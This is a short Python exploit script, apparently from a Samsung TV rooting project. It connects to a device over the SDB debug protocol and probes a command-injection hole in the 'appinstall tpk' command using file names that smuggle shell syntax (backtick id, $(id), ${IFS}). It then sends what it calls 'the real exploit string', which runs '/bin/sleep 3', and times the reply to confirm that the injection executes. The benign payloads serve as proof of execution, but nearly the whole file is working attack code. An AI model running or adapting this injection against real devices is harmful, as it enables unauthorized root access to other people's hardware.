import sys, time
sys.path.insert(0, 'src'); sys.path.insert(0, '.')
from sdb_wire import SdbWire, SdbWireError
from samsung_tv_root.sdb import build_shell_injection

w = SdbWire('192.168.3.191', timeout=15)

tests = [
    '0 appinstall tpk test`id`.tpk',
    '0 appinstall tpk test$(id).tpk',
    '0 appinstall tpk test${IFS}x.tpk',
]
for c in tests:
    try:
        out = w.shell(c, seconds=10)
        print(repr(c), '=> OK:', out[:150])
    except SdbWireError as e:
        print(repr(c), '=> RECUSADO')

# the real exploit string
inj = build_shell_injection('/bin/sleep 3', gate_token='0123456789abcdef')
cmd = '0 appinstall tpk ' + inj
print('\ninject cmd:', cmd[:80], '...')
t0 = time.time()
try:
    out = w.shell(cmd, seconds=15)
    print('elapsed: %.2fs' % (time.time() - t0))
    print('output:', out.decode('utf-8', 'replace')[:400])
except SdbWireError as e:
    print('RECUSADO:', e)
w.close()
